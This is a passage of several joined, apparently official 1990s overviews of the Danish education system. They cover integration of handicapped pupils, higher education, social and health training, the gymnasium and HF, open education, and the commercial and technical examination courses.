made of anumber of solutions in the light of the special requirements of this particular pupil. In this long series of decision processes the psychological service of the school has played amajor role as the team responsible for combining the special educational needs of the pupilwith the parents' wishes, the offers of the school and available resources. Consequently, upthrough the 60s and 70s, the local offices of the school psychological consulting serviceshave been granted more resources. This has meant that, unlike what hap-pens in certainother countries, they could invest more time and expertise in a careful review of possibleintegrated solutions, instead of automatic segregation. The pedagogical/psychological study programme that was launched in 1967 at the RoyalDanish School of Educational Studies made for a marked improvement of the educationallevel of the school psychologists. As consultants on choice of schools and optimumintegration it has clearly proved an advantage for school psychologists in Denmark - unlike inall other countries - to be trained teachers who, after substantial practical teachingexperience, have completed a supplementary training course in psychology. 11. The Teachers Teaching staffs have had a remarkably positive attitude to the integration efforts and haveoften played an active role in the process. This applies to teachers in mainstream schoolsand special schools alike. Perhaps it has been important that ordinary teachers and special teachers - unlike what is thecase in many other countries - share the same basic training and have access to the samein-service training courses. This has allowed an exchange of knowledge and experience totake place between special education and ordinary teaching, which is, indeed, a condition fordevelopment in both. 12. The Teaching Concept Another essential factor in the development process has no doubt been that Denmark - likethe other Nordic countries, but in contrast to many other European countries - operates with afairly broad teaching concept, which implies, as mentioned earlier, that all children areconsidered to be fit for instruction and to be covered by the preamble of the Act on theFolkeskole. It is widely accepted that the contents of the instruction must be adapted to therequirements of the individual pupil and should not merely be imposed by generalprofessional standards. In addition, the school - not least throughout the 70s and 80s - hasbeen able to involve a social, educative dimension into its activities. To a large extent, this development has been necessitated by the fact that 4/5 of the parentgroup have joined the labour market on a full-time basis (including 60-70 per cent of the mothers),and that the grandparents, for various reasons, help out to a still lesser degree with the careand the upbringing of the children. 13. The Resources Integration is feasible only if necessary resources are provided for the teaching framework, inwhich the integration takes place. This applies to a situation of non-segregation and to asituation in which the pupil, after having been referred to an institution of special instruction,is transferred back to the mainstream school (integration). In the former situation - which has, by now, become the most frequent by far - it has been upto the local school authorities to decide whether they wanted to spend special resources onintegrated instruction, though, up to 1980, with the formal limitation that the relevantlegislation, including its provisions on the distribution of costs, gave incentive to theFolkeskole of referring severely handicapped pupils to schools under the special careprovision. If an increasing number of pupils with potentials as special care pupils, in the 70s, were, afterall, integrated, the reason was that local school systems took on tasks they were not obligedto take on, and for which the government was economically responsible. The system ofrather ample block grants coupled with the liberal municipal tax system probably promotedwhat was then referred to as "the sneaking integration". After decentralization of the special care services in 1980 it became easier to let "theresources follow the child", and even though there are still two levels of authority involved inthe comprehensive special education provision of the Folkeskole (local authorities andcounties), most decisions on choice of school for the individual pupil are made without takingmuch account of the resource allocation. In general, there has been a useful cooperationbetween local authorities and counties regarding referral of the child, and it has no doubt alsohelped matters that the resource needs of each pupil are almost identical in the integrated asin the segregated situation. It is worth mentioning, however, that integration policies differ somewhat from region toregion, and that there are local discrepancies within regions. It has been easier for somecounties than for others to cope with a dual situation where, on the one hand, they had tomaintain - and pay for - a special school provision and, on the other, they also had to paywhen the pupils received instruction in the municipal schools. In most cases, however, ithas been possible to comply with the parents' wishes as regards choice of school; and it canin general be stated that the character and degree of integration in Denmark is in closecorrespondence with the wishes of the users - in casu, the parents. 14. The Various Groups of Handicapped Som functional problems have been easier to tackle in the ordinary school than others. Ingeneral, handicaps such as communication failure - deafness, autism, severe mentalhancicaps - have presented the greatest difficulties. As far as deaf children are concernedwho are dependent on sign language, it has not been possible to set up integrated solutionsthat are acceptable to the parents; hence, most of these parents prefer to have their childrenattend schools for deaf. The same applies, to a high degree, to autistic or psychotic children.As regards mentally handicapped, including multi-handicapped, children, certain experimentshave been made in various parts of the country, the result of which is that some parents arefor, others against integration of their child in the ordinary school. Other groups of handicapped children give adequate proof of successful integration so that itis safe to say that it is both possible and fruitful for these children to receive instruction in anordinary school environment. 15. Limits to Integration During the 20-30-year period, in which integration has been a fundamental principle inDenmark's educational policy, it has often been pointed out from various quarters, that thereare children who cannot be integrated, and that integration was not beneficial in all cases.The development, however, has shown that the possibilities were greater than the limitations,and that the integration often succeeded in practice in cases where it had been deemedimpossible in theory. In spite of this experience, there are never the less situations where the choice between anintegrated and a segregated school placement will forthwith favour the segregated solution.Such a choice is based on the combined considerations of the nature and degree of thehandicap and the endeavours made to adapt the ordinary school to the pupil concerned. 16. Parent Rights The choice between an ordinary school and a special school is never an easy one, and bothsolutions will have positive as well as negative aspects in many cases. It is thereforeimportant that the parents have a decisive influence on the choice. For many years, aspecial school was the only option available to many handicapped children, thus leaving theparents with no choice. The position now is that the parents, in most cases, can decide ifthey want their handicapped child to attend an ordinary school or a special school. Inaddition, there are many ways in which parents can seek advice and guidance about theirchild's possibilities and needs; also, the choice of school is not binding for the whole schoolcareer. The parents are entitled to a reevaluation, at least once a year, of their child'sschool situation. This could involve a change of school, if, for instance, a successfulintegration that has taken place at one of the lower form levels runs into trouble at the time ofadolescence. 17. Status and Future The degree of integration of handicapped pupils in the ordinary school in Denmark hasreached a level, which is hardly matched by any other country. Whether or not it will bepossible to progress even further is an open question, which depends on a number of factors.As far as we are concerned, the following points must have an impact on futuredevelopments: that the Folkeskole - and the rest of the education system - should continue to aim atbeing able to demonstrate such consideration and flexibility that a handicap in itself does notprevent real integration, that it is primarily up to the users/parents - on the basis of useful consultation - to decideon the character and degree of integration, that a wide range of possibilities should still be available so that parents have a realchoice, that the total responsibility for the Folkeskole should gradually be transferred to theprimary municipalities, continued development - at local, regional and national level - of adequate educationaland pedagogical expertise to support and qualify the integration, that fulfilment of the aggregate needs of the handicapped child for special educational,social and medical support should be coordinated at local level, so that it will constitute a fullsupport effort, that integration is always organized and carried through in such a way that it constitutes apositive and fruitful experience for everybody involved in the process, that the teachers are trained in such a way, on a current basis, that they can differentiate their teaching so as to allow for the multiplicity of the pupils, that a pedagogical/psychological consulting function is maintained to offer guidance and support in difficult teaching situations.

In 1994, 128,000 students received DKK 3.6 billion in grants, and 58,900 took out study loans amounting to a total of approx. DKK 776 million. The system of higher education is administered centrally by the Ministry of Education�s Department of Higher Education. Certain short, non-academic courses of education are administered by the Ministry of Education�s Department of Vocational Education and Training. Courses of education within such fields as art, architecture, librarianship and marine engineering are, however, placed under other ministeries. The system of higher education offers a great variety of choice. More than 130 institutions offer study programmes of varying lengths and levels. These institutions can be divided into: universities, university centres and other institutitions of higher education. This multiplicity of choice has been further strengthened by a significant development of the non-academic higher education system within the field of further commercial and technical education. In order to ensure coherence of policy across the broad range of higher education, 5 consultative bodies have been established to advise the Minister: The National Advisory Board for the Humanities, the National Advisory Board for Health Education, the National Advisory Board for the Natural Sciences, the National Advisory Board for Technology and the National Advisory Board for the Social Sciences. Each board consists of ten members appointed by the Minister. Finance The system of higher education is financed by the Danish State. The institutions are, however, able to secure extra income through the offering of special courses and the sale of know- how. The cost to the Danish State of a graduate from a higher education institution averages from DKK 270,000 (social sciences) to DKK 725,000 (medicine). In 1994, a new financing system was implemented in higher education. The main principles of the new system are among other things that the institutions are awarded a lump sum grant�, and that they are free to make their own priorities between the different departments and between education and research. The lump sum grant will consist of the following calculation elements - the same initial amount for each institution. - a taximeter grant per active student (according to the principle of �the money follows the student�). There are 12 different taximeter� levels. Administration The great variety of institutions is reflected in a variety of institutional statutes. Universities, university centres and the other higher education institutions with university status are, however, subject to the same Parliamentary Act (from 1992). The Rector, who is elected for a period of 4 years from among the permanent full-time academic staff, has the formal responsibility for the management of the institution and is responsible for the day-to-day running of the institution. The Senate is the supreme collegiate body of the institution. It safeguards the interests of the institution in matters relating to education and research. It establishes guidelines for the long-term planning and devel-opment and approves the budget. It consists of 14 members. The Rector is its ex officio chairman. 2 of the members come from outside the university. They must be competent in matters relating to research and higher education. The next level, the faculty, is run by an elected dean. The faculty council establishes guidelines for the long-term planning and approves the budget of the faculty. This council also has 2 members from outside the university. A study committee consisting of an equal number of teachers and students is set up for each study programme. Research and related activities are normally placed with departments (institutes). Each department elects a head of department and a departmental board. The new Act of 1992 has increased the autonomy of the universities and other higher education institutions with university status, mainly economically, and it has made it easier to see who is responsible for the decision-making and the taking up of new tasks. The procedures within the universities etc. have furthermore been simplified. The Institutions and the Courses Offered Universities and university centres offer courses and carry out research in traditional academic disciplines. As a rule, a university course now consists of a 3-year programme leading to a Bachelor�s degree, followed by a 2-year programme leading to a Master�s degree. In most cases, a degree subject is a self-contained structure, and the students choose their degree subjects at the commencement of their studies. 3 years of supervised postgraduate studies lead to the Ph.D. degree. Independent research leading to a doctor�s degree proper often takes 5 to 8 years. The degree programmes offered by Roskilde University begin with a 2-year and those offered by Aalborg University with a 1-year basic course, which qualifies students for a number of further courses of study characterized by an interdisciplinary, problem-oriented approach. The other university-level higher education institutions carry out research and offer education within areas such as engineering, veterinary science, pharmacy, architecture, music, art and in various business-related subjects. The colleges of education train teachers for the Danish Folkeskole and have their own independent research institution: The Royal Danish School of Educational Studies. The non-academic institutions offer short and medium-cycle courses, especially within the areas of technology, education, social work and health. Admission In Denmark, the entrance qualifications for higher education are: the Upper Secondary School-Leaving Examination, the Higher Preparatory Examination (HF), the Higher Commercial Examination (HHX) and the Higher Technical Examination (HTX). Certain non-academic institutions may however admit students who do not have any of these qualifications. Alternative requirements may be 910 years of school attendance, followed by work experience, an entrance examination or a supplementary examination. In 1995, approx. 40,000 young people were admitted to higher education, and in 1996, there will be 43,500 study places available. There will only be restricted admission at very few courses, e.g. medicine. In Denmark, there are no tuition fees in higher education. The places are divided into two quota systems. The places in the first quota are distributed to applicants with a Danish qualifying examination, in accordance with the marks obtained in the leaving examination. The places in the second quota are accorded to other applicants, who either meet the admission requirements or are found likely to be able to complete the course for which they have applied. Applicants with an international/foreign qualifying examination are also accepted through this quota. All applicants in the second quota are individually assessed by the institution. An upper limit may be set for the admission of non-Danish citizens. The limit does not, however, apply to EU-citizens and refugees. All applicants who are to be admitted through the second quota must apply for admission before 15 March with a view to starting in September of the same year. The Academic Year, Length of Terms, Degrees, etc. The academic year is divided into two terms: from September to December and from January/February to May/June. Students have a week�s holiday in October, at Christmas and at Easter. Bachelor�s degrees can now be obtained within many of the universities� main areas after 3 years of study. Another two years of study lead to the award of a Master�s degree (cand. mag., cand. scient., etc.) In the Humanities, there is also a special 6-year degree course leading to the degree of mag.art. Most courses of study leading to the award of a Master�s degree are prescribed to take 5 years. In most courses of study, the tendency has been for students to exceed the prescribed time, but in recent years this tendency has been increasingly reversed. The designations of the research degrees proper are the Ph.D.degree and the doctoral degree (dr. phil., dr.scient. etc.), which is the highest academic degree. At most examinations - and all final examinations - there are external examiners. Marking Marks are given according to the 13point marking scale. Marks 10-13 are given for the excellent performance, 7-9 for the good performance, 6 for the satisfactory performance, and 0-5 for the poor performance. Research Publicly financed research, which constitutes approx. 45% of the research carried out in Denmark, takes place partly at the higher education institutions and partly at the so-called government research institutions. The higher education institutions decide themselves what research is to be undertaken. The collegiate bodies decide on the distribution of research funding and research commitments among departments and staff. The designations of appointments are structured as follows: assistant professor (limited tenure, normally 3 years), associate professor and full professor. These appointments require as a minimum qualifications at Ph.D. level. All categories of appointment carry both a research and a teaching commitment. The proportional amount of time to be devoted to research and teaching is not regulated by legislation or agreement. The resources and annual manhours available for research appear from the Appropriations Act of the year. The Ministry draws up separate budgets for research and teaching, which means that research grants can in principle be maintained unchanged, even though teaching grants are adjusted. The amount of research carried out therefore varies from institution to institution and from main area to main area. Postgraduate Studies Danish postgraduate studies are at present undergoing considerable development, as higher priority is being given to Ph.D. programmes at all universities and other institutions of higher education. All Danish postgraduate studies are internationally oriented. From 1993, the extent of the Ph.D. programme corresponds to three years of study mostly based on a completed Master�s degree. The research student will typically be integrated in two or more active research groups or networks, preferably also abroad, participate in courses corresponding to 6 months, and carry out an independent research project ending with a thesis. Evaluation of Higher Education In order to ensure quality in higher education, the Ministry of Education has established the independent institution, the Centre for the Evaluation of Higher Education. The tasks of the Centre are - to initiate evaluation of higher education in Denmark; - to develop appropriate methods of assessing programmes; - to inspire and guide the higher education institutions in aspects relating to evaluation and quality control; - to compile national and international experience regarding the evaluation of education systems and quality development. A substantial part of the Centre�s work consists in regular and systematic evaluations of programmes on a rotating basis, by which all programmes will be evaluated within a period of five to seven years. In addition, the Centre evaluates new programmes after an initialperiod, and programmes for which the relevant partners find that there is a need for an evaluation of the quality of the programme. Open Education Open education is an offer of vocationally qualifying part-time education for adults. State grants cover approx. 80% of the costs of open education. The institutions themselves set the tuition fees, which typically range from DKK 1000 to DKK 1500 per subject per term. Employers wishing to purchase open education as part of a staff training programme are, however, required to pay the full cost. Open education is offered on a single subject basis at the institutions where the corresponding full-time courses are taught. Examinations are held with external evaluation. A pass can be transferred as a credit to the corresponding fulltime course of education. Admission requirements are the same as for full-time courses, but non-academic qualifications may be given considerable weight with respect to admission to open education, if there are more applicants than available study places. The institutions offer courses in for example modern languages, natural sciences and business studies, and each year the number of courses increases. Internationalization The Danish system of higher education is being increasingly influenced by international developments in all fields. A growing number of Danish students take part or the whole of their education abroad, and more and more foreign students are coming to Denmark both as guest students under international exchange programmes such as ERASMUS, COMETT and TEMPUS and as regular students. It is expected that in 1995/96 the ERASMUS-programme alone will arrange for the exchange of approx. 2500 Danish students with a corresponding number of EU students. The teacher exchange is also on the increase. The NORDPLUS-programme has further strengthened the already well developed Nordic cooperation on teacher and student exchanges. The language of instruction at the higher education institutions is for the most part Danish, and intensive Danish courses are offered to foreign students who have been admitted to higher education courses. An increasing number of courses are however held in foreign languages, mainly in English. Many postgraduate courses are also held in foreign languages. Student Unions Students are represented in the governing bodies of the institutions. Election to a governing body takes place through nomination via the students� political organisations, which at the national level are associated in umbrella organisations. Thelargest of these are the Joint Council of Danish Students (Danske Studerendes F�llesr�d - DSF), the National Union of Moderate Students (Landssammenslutningen af Moderate Studerende - LMS), the Student Council of the Danish Engineering Colleges (Studier�det ved Danske Teknika) and the National Council of Students at the Colleges of Education (L�rerstuderendes Landssektion).

It is the aim of these courses to qualify staff in the welfare, care and nursing area for broadbased functions, so that patients and clients do not have to deal with so many different staff groups, when they find themselves in a situation where they need to make use of the care and welfare services. All these courses are generalist courses which replace the former more specialized courses leading to qualifications as a.o. home care assistants, occupational therapy assistants, practical mental nurses, practical nurses and nursing home assistants. It is the perspective to combine pedagogical/social and activating qualifications with nursing qualifications and thus obtain more preventive and resourceoriented work forms in the social and health sector. The new training system is structured in phases as a coordinated system with 3 qualification levels: , a 1�year advanced training programme for social and health service assistants, further education courses leading to qualifications in nursing, socioeducational work etc. In order to continue with a further education programme, the students must pass an entrance examination, for which the detailed regulations have not yet been established. Furthermore, an introductory year has been established for young people who enter the courses directly from the 9th form of the Folkeskole, and for others who may need to attend this introductory year. The introductory year is not qualifying; it merely introduces the students to the work area. It consists of approx. 2/3 practical training and 1/3 theory and contains a number of qualifying optional single subjects. The basic social and health training programmes are sandwichtype courses where practical training alternates with theoretical education. The courses consist of 2/3 practical training and 1/3 theory and comprise long practical training periods within the work area in question and theoretical instruction at a school. The theoretical instruction which takes part at a school comprises a number of obligatory area subjects. The training programme for social and health service helps comprises the following 5 obligatory area subjects: 1. The practical subjectgroup. 2. The culturalactivityrelated subjectgroup. 3. The pedagogicalpsychological subjectgroup. 4. The sociological and social subjectgroup. 5. The nursing subjectgroup. The training programme for social and health service assistants comprises the following 6 obligatory area subjects: 1. The workorganizational subjectgroup. 2. The sociological and social subject-group. 3. The culturalactivityrelated subjectgroup. 4. The pedagogicalpsychological subjectgroup. 5. The medical subjectgroup. 6. The nursing subjectgroup. The practical training part of the training programme for social and health service helps comprises practical and personal assistance, activation and elementary nursing tasks. The practical training takes place in municipalities in the homes of the clients and in nursing homes. The practical training part of the training programme for social and health service assistants comprises the main areas: care, activation and basic hygiene and nursing. The practical training takes place in municipalities and counties with 1/3 in the municipality and 2/3 in the county. A great part of the county-based practical training shall take place within the somatic hospital service. It is furthermore possible to take part in optional qualifying courses against a reduction in the practical training of a maximum of one month in the case of the basic course and 1� months in the case of the advanced course. The qualifying optional subjects are meant to give the students a ballast of general knowledge, strengthen their personal development and qualify them for further education and training. Admission In order to be admitted to the training programmes for social and health service helps and assistants, the students must have a practical training place. In each county region, a joint board has been set up which on an annual basis, and on the basis of the total projected need of staff of the region shall decide on how many practical training places it is necessary to set up in the region. The students shall enter into a training agreement with the municipality and/or county and is thus ensured a place both in the theoretical and in the practical part of the training programme. Financial situation of students The students are paid a salary during the training programme, but not in the introductory year. The salary reflects the extent to which the student is expected to take part in the work of the practical training place. The salary and working conditions are laid down in an agreement which has been made between the main bargaining organizations of the particular work area. The salary amounts to approximately 50% of the salary of a graduate. Assessment The work and achievement of the students are assessed during the whole training programme. The assessment is given on the basis of examinations, assignments or as general proficiency statements on completion of a practical training period. The Ministry of Education appoints external examiners for the final examinations. They shall ensure quality and homogeneity in the training programmes and ensure that the students are given an objective and fair assessment. Certification Upon completion of the training programme, the student is given a certificate. The certificate contains the following information: the title of the training programme, the examination results, the general proficiency statements as well as the type of practical training places. Persons with qualifications obtained before 1991 may also acquire competence as social and health service helps or social and health service assistants in specially organised upgrading courses.

About 90% of all children attend the public education system, the �Folkeskole�, which provides pupils with primary and lower secondary education, usually in mixed ability groups who often stay together for the entire nine years. About 45% of the pupils stay on for an optional tenth year. Nearly all school-leavers continue in upper secondary education: about 50% in vocational schools (technical or commercial) and 45% in schools providing general upper secondary education. About 5% leave or drop out of the education system after the Folkeskole. The �Gymnasium� and �HF� There are two forms of general (i.e. non-vocational) upper secondary education in Denmark: the �gymnasium� and the higher preparatory examination courses, the �HF�. Institutions may offer both courses either in a package or as single subjects. The county councils are responsible for the financial administration of general secondary institutions, of which 85% are publicly owned. A dozen schools take boarders. The national examination system is administered by the Ministry of Education which is also responsible for the content and for monitoring the quality of the education. The �Gymnasium� The �gymnasium� is a three-year course leading to the Upper Secondary School Leaving Examination (�studentereksamen�), which qualifies for admission to university and other higher education studies. The aim of the �gymnasium� is to provide general education as well as to prepare the students for continued studies. There are approximately 150 �gymnasiums� in Denmark. About twenty are private independent institutions financed by the state with up to 80-85% of their budgets. Admission To be admitted to the �gymnasium�, a pupil must have completed nine years of basic education with English from year four and a second foreign language from year seven (German or French). The pupil�s basic school of origin must declare the applicant qualified for the �gymnasium� , and applicants must have taken the Leaving Examination of the �Folkeskole� with satisfactory results. The Subjects The �gymnasium� is divided into two lines: the languages line and the mathematics line. The two lines have a common core of obligatory subjects as well as subjects that are distinctive to each line. Some of the optional subjects are available at two levels: intermediate level and high level. A core of basic subjects must be offered at all schools; optional subjects vary from school to school. At least two of the subjects studied by a student must be at the high level, and all students must write a major assignment. Examinations After the third year, all students take a written examination in Danish and in the subjects chosen at the high level. The number of oral examinations varies in accordance with the range of subjects chosen. A total of ten examinations must be taken in order to pass the complete examination, of which up to three may be taken after the first and second years. Higher Preparatory Examination (�HF�) The Higher Preparatory Examination (Danish abbreviation:�HF�) was introduced at the end of the 1960s and is above all directed at young people and adults who have left the education system and wish to return. It is also possible for pupils to attend an �HF�-course directly after the 10th year of the Folkeskole. Like the �gymnasium�, the HF- courses offer general education as well as prepare the students for continued studies. A full-time student may complete the course in two years, but for adults the examination can also be taken on a single-subject basis or as a combination of subjects to form a complete examination over a longer period of time. Single subjects or even a complete �HF�-examination may be taken on a private basis. Such students are offered two lessons of examination guidance per subject. There are about 145 institutions offering the Higher Preparatory Examination course in Denmark. 65 of them are attached to �gymnasiums� offering mainly full-time two-year courses. About 75 adult education centres offer �HF� mainly as single subjects. As a parallel activity, these centres provide general education at a more basic level for adults. Admission In order to be admitted to a higher preparatory examination course in one or more subjects, the student must have finished lower secondary education at least one year before admission to the course and be accepted by the �HF�-institution as qualified. Students wishing to be admitted directly from the basic school to a two year course must have completed ten years of basic school and must be considered qualified by their schools of origin. The Subjects �HF�-subjects are comparable to �gymnasium�-subjects as to level, but differ somewhat in content. A number of optional subjects, however, are identical in both types of education. Some of the �HF�-subjects may be chosen at two levels, and in some subjects there is a possibility of taking the examination at a level corresponding to the high level of the equivalent �gymnasium�-subject. Examination A complete higher preparatory examination consists of a cluster of common core subjects, three optional subjects and a major written assignment. Students may choose to take the optional subjects at either intermediate level or high level. An important difference from the �gymnasium� is that a complete higher preparatory examination requires an oral and/or a written examination in each subject studied. Like the�studentereksamen�, the �HF� qualifies for admission to higher education, although specific optional subjects or a specific level of attainment may be required. Special Features Major Written Assignment Students in the �gymnasium� as well as students wanting to take a complete Higher Preparatory Examination must submit a major written assignment on a subject chosen by the student. The assignment is written in one week, which is free of lessons. It is assessed by the teacher and an external examiner, and the mark is part of the overall examination result. Student Influence Students� councils are statutory, and decisions about the form and content of the teaching are made jointly by teacher and students. The students also have a say in the choice of examination syllabus. Student Counselling Every institution offering upper secondary education has a number of counsellors appointed locally among teachers, who have been specially trained. A third of their working time is devoted to counselling: career guidance as well as general pastoral care. Grants and Loans Students at a �gymnasium� or �HF�-institution are eligible for financial support in the form of a State grant or loan. The kind and extent of the support is based on the applicants� age and their own or, in some cases their parents�, financial circumstances. To obtain a grant or loan, the applicant must be a Danish citizen. However, in certain circumstances, students from other countries may receive support according to the rules applying to Danish citizens. National Administration of Examinations All material offered at the examination must be approved by the ministry. The ministry draws up the written examination papers and appoints external examiners for the oral and written examinations. Examination papers are assessed by two external examiners. Each year, the ministry decides on the subjects in which the students in the �gymnasium� shall be orally examined. The higher preparatory examination is always taken in all subjects. By fulfilling the attendance requirements candidates at both examinations obtain the right to be examined in a limited part of the syllabus. Examination Averages Marks are given on a scale from 0 to 13. The final result of a �studentereksamen� includes the marks gained in the examination as well as the marks given by the teacher at the end of the course. In order to pass, the student must obtain a minimum average of 6.0, both in the year�s work and in the examination. In the �gymnasium�, the student�s progress is continually assessed and term marks are given twice a year. No marks are given at the higher preparatory examination courses. The examination average is based solely on the marks gained at the examination. Teacher Qualifications To obtain permanent appointment at a �gymnasium� or an HF-institution, a teacher must be a university graduate at what corresponds to M.A. or M.Sc. level, and he or she must have taken an additional course in educational theory and practice. School Management Each school has a headteacher, who is accountable to the county council, the school governors and the Ministry of Education. Otherwise schools are run on a non-hierarchical basis with a very limited number of assistants to the head and no other middle management. Teachers� councils are statutory, and teachers as well as students take an active part in the decision-making at all levels. School Governors At all public �gymnasiums� and higher preparatory examination institutions, a board of governors must be elected. The board consists of student, teacher and staff - and in the case of the �gymnasium� of parent-representatives. The county council is also represented on the board. It is also possible to coopt, for example, representatives from trade and industry on to the school board. Within the provisions of the law and the overall local county council education budget, the board fixes the school budget, decides on the size of classes and makes decisions about the subjects to be offered by the school. The board has no say in the appointment of personnel: this is the responsibility of the headteacher, whose nominations are then formally endorsed by the county council. The School Year The school year is 35-36 weeks, excluding the examination period.

Together with other initiatives, the act is to make it possible to carry through the Government�s objective of extending the supply of adult education. Open education in principle comprises all vocationally oriented courses of education from basic vocational education and training to long-cycle higher education programmes as well as short, condensed courses. Open education has made it possible to establish a flexible and market-based supply of vocationally oriented education for adults in that the educational institutions are free to offer education within areas where there is a demand. The main principle is that adults can, throughout their lives and whenever they feel a desire and need to do so, return to the education system to update already acquired qualifications or further educate themselves for a higher level of education. And it is possible to follow the teaching at a pace which suits the individual. The participants can choose to follow the teaching in some subjects or modules of courses or complete an entire course of education. The target Group Adult education is open to everybody, i.e. employed people who educate themselves in their leisure time or during working hours; employed people on educational leave; employed people with a low level of educational attainment, who receive adult educational support during the course; and unemployed people, including unemployed people who take part in education as part of the activation scheme of the labour market. Forms of Organizing the Teaching under the Open Education Scheme The educational activities, which must lie within the area of responsibility of the Ministry of Education, are as follows: � Parttime courses. � Fulltime courses organized on a parttime basis. � A novelty within this framework is the offer of special courses, the socalled �creditcourses�, for persons with long-term work experience within the area concerned. The work experience of the participants gives credit for the practical training of the courses. For the moment, �creditcourses� are established for the following programmes: the educator training programme and the training programmes for social and health service helps and assistants. � Single subjects forming part of fulltime and parttime courses of education. � Short courses of 18 weeks� duration converted into fulltime. The contents of the courses may be organized freely by the educational institution. � Specially organized courses made up of educational activities as those mentioned above of up to one year�s duration converted into fulltime. These courses make it possible to combine general and vocationally oriented elements in the teaching. Up to 1/3 of the courses may consist in general adult education or other education, including courses offered by private course providers. The stage has thus been set for a great extent of local cooperation between institutions. Within the 1year framework, it is also possible to offer parttime courses organized in the form of fulltime instruction. All the teaching is organized at local level. It is thus possible to take account of the participants� and businesses� possibilities of fitting the educational activities in at different times. The teaching may take place both in the daytime, in the evening, in the weekend and in the form of distance learning. The educational institutions are furthermore free to offer �empty� study places in the fulltime courses with grants according to the Act on Open Education. It is thus possible to participate in open education even in those cases where the intake to a given subject is not big enough to form a class. Open education confers the same qualifications as the corresponding courses taken in other ways. Entire courses and single subjects offered under the open education scheme may be completed with a fully recognized diploma. The admission requirements are in principle the same as for the corresponding fulltime courses. The Educational Institutions It is the main rule that the educational institutions which can offer courses under the open education scheme are those which are already recognized to offer vocationally oriented instruction under the responsibility of the Ministry of Education, i.e. vocational schools, universities, business schools, engineering colleges, colleges of education, adult vocational training centres, social and health schools etc. Under the open education scheme, the institutions can offer all or parts of the courses which they are already entitled to offer. The supply, including the number of study places, is determined by the individual institution itself. Financing All paying participants release a fixed State grant to the educational institution. The grant, the so-called �taximeter� grant, is awarded for partial compensation of the expenditures relating to the teaching, and from 1995 in the case of the vocational schools of the capital expenditures. Other expenditures are covered through tuition fees. The tuition fees are fixed by the educational institution. Unemployed people participating in open education activities as part of an activation scheme get their tuition fee covered. Employed people with a low level of educational attainment, who receive adult educational support (VUS), receive a grant towards the tuition fee. Open education cannot be reserved for certain businesses or the like, but must be advertized to the general public. The educational institutions may however offer special, tailor-made courses to certain businesses according to the provisions on income-generating activities. No public grants can be obtained for this type of activity. The Activities Open education makes up more than 2/3 of the total public provision of vocationally oriented adult education. On an annual basis, approx. 21,000 student full-time equivalents participate in open education. This is estimated to correspond to approx. 90,000 persons. As participants often follow a number of different subjects at a time, the number of participants in classes is greater, i.e. approx. 200,000. The extent of the activities is expected to increase in 1995 and the subsequent years, as the educational institutions become more and more confident with the new and more flexible organisational possibilities provided by the new set of rules. At the same time, extraordinary development grants have been introduced in 1995 with a view to promoting the initiation of new offers of education. The majority of the participants (i.e. approx 2/3) attend open education at the vocational schools and first and foremost the commercial courses: the Merkonom modular study programme, single subjects for the higher commercial examination and single subjects of the commercial vocational education courses. At the higher education institutions, the most popular courses are the diploma courses in economics (HD) of the business schools and the humanities programmes of the universities. Study programmes within the technical and natural sciences areas only make up a very small part of the open education provision. Ensuring a Relevant Provision The educational institutions are responsible for the ascertainment of the needs of the local business sector and different local user groups and for the establishment of cooperation between the institutions at local level. A council responsible for open education has been set up in 1994, which is among other things to give advice at central level regarding the make-up of the total supply of open education on the basis of industrial, labour market and educational policy assessments. In this connection, the council is also to present proposals for measures which can further the supply and if necessary also change the profile of the supply. The Minister of Education may allocate grants for the implementation of innovation and development work, including the development of new courses. Questions to this effect are dealt with in the council. Experiments with Technology-Supported Learning With technology-supported learning (distance learning), it will be possible to offer a broader variety of high quality courses - also in more thinly populated areas. Through cooperation, it will be possible for small institutions/subjects to create new possibilities of increased quality through joint use of teacher resources and an increased supply of quality teaching. The choice of this form will also increase the possibilities of a massive extension of the educational capacity with limited or no building needs at all. Experiments with increased education and training offers have been initiated on the island of Bornholm. Addresses: Department of Economic Affairs Frederiksholms Kanal 21, DK1220 Copenhagen K.

A few colleges offer both courses, but normally they are offered at business colleges and technical colleges, respectively. Both are of three years� duration. Both examinations qualify for admission to higher education, and they also qualify for occupational employment. Suited pupils, who have completed the 9th form of the Folkeskole, have access to both courses. The Higher Commercial Examination Course The course commenced in 1888 on a private initiative at Niels Brock Business College. Like today, the subject range comprised both commercial and general subjects. At the beginning of the 1970s, the course had spread to half of the business colleges, and from 1982 it was offered at all business colleges. Within the past 20 years, the number of students has almost quintupled. There used to be restricted admission to the course, but today alle qualified applicants are admitted. Structure Around 2/3 of the teaching time is spent on obligatory subjects and 1/3 on optional subjects. By means of the optional subjects, the student has a chance to give the course a profile which suits his or her personal interests and future plans. The student may for instance strengthen the language side of the course by choosing an extra foreign language. And through the subjects chosen at high level, special emphasis can be laid on the economic side or the language side of the course or on a combination of the two. All subjects are placed in a joint upper secondary system of levels with the levels A, B and C, where A is the highest level. Most of the obligatory subjects comprise at least 2 years� teaching in the subject. The optional subjects which may both be extensions to the obligatory subjects or totally new subjects, are on the contrary of one year�s duration. One two-year optional subject must however be chosen: either mathematics or an additional foreign language. In the first year, about half of the subjects are common with the subjects in the vocational education and training courses in the area of commerce, clerical trades and public administration. This applies to subject-areas within information technology, commerce and social sciences. The other obligatory subjects are Danish, business economics, English and a second foreign language (German, French or Spanish). To this should be added an optional subject. After the first year, the student may change to a vocational education and training course in the area of commerce, clerical trades and public administration. In the second year, the instruction continues in Danish, business economics, English, the second foreign language and the optional subject. To this should be added instruction in sales, information technology and contemporary history. In the third year, the instruction continues in Danish and contemporary history, and to this should be added international economics and commercial law. The student must furthermore choose 3 or 4 optional subjects, of which at least 2 must be at level A. The optional subjects may be extensions to the obligatory subjects, e.g. business economics (A), English (A) and sales (A). Or they may be entirely new subjects, such as environmental studies, history of ideas, media knowledge and psychology. Major Written Assignment In the last year of the course, all students must in the course of a week elaborate a major written assignment. The students do not receive instruction during this week. It is the students themselves who choose the subject in which the assignment is to be written, and in co-operation with the subject-teacher they decide on the area to be dealt with in the assignment. The concrete formulation of the asignment is made by the teacher. The assignment is corrected and assessed by the teacher and one external examiner. The 1-Year Higher Commercial Examination Course For students who have already acquired one general upper secondary qualification, there is a specially organised higher commercial examination course of one year�s duration. The obligatory subjects in this course are: business economics (B), sales (B), information technology (B), international economics (B) and commercial law (C). In addition to this, the student must choose two optional subjects. The examination in the subjects mentioned is common with that of the 3-year course. The Higher Technical Examination Course The higher technical examination course (the �HTX�) was introduced in 1982. It is primarily directed at young people who are interested in science and technology. The course comprises both technical subjects and general subjects. The course is offered at the technical colleges. Although it is a fairly new course, it is offered at most (i.e. 